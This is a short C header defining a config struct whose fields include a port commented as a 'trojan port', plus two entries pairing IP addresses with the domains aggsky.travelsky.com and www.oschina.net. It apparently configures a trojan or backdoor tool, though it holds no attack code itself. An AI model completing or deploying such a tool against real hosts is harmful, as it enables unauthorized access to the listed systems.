#ifndef __CONFIG_H__
#define __CONFIG_H__

typedef struct config
{
    char sip[16];
    unsigned short sport;
    unsigned short trojanport; // 木马端口
} config_t;

config_t configs[] = {
    // aggsky.travelsky.com
    {"122.119.4.127", 80, 0},

    // www.oschina.net
    {"212.64.62.174", 80, 0}};

#endif